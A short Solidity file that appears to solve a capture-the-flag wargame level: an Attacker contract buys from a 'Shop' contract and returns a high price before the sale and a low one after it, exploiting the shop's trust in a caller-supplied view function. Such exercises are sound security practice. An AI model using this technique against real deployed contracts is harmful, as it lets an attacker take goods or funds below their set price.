// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/level21.sol";

contract Attacker
{
    Shop level21;
    constructor(address _level21)
    {
        level21 = Shop(_level21);
    }

    function exploit() external
    {
        level21.buy();
    }

    function price() external view returns (uint256)
    {
        return (level21.isSold() ? 1 : 100);
    }
}